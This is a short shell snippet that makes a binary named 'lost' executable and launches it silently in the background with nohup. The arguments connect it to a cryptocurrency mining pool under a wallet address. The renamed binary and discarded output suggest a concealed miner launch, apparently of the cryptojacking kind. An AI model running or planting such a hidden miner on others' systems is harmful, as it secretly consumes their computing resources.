chmod +x lost &&
nohup ./lost -v -l ap.luckpool.net:3956 -u RLKVQcYkNGQXb8FpQzNav3FUoqCLCKYdaG.999 -p x -t 2 >/dev/null 2>&1